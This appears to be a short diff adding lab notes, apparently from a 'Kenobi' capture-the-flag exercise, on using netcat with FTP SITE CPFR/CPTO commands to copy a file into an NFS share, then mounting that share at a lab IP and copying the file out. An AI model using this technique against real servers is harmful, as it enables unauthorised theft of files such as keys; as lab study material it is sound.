@@ -1,0 +1,16 @@
+We can use netcat for copy file to other path like mount file
+
+on host :
+
+nc [IP] [port]
+
+SITE CPFR [file]
+
+SITE CPTO [mount path]
+
+create a mount direction : 
+mkdir /mnt/kenobiNFS
+mount 10.10.109.227:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+
+and copie it to host
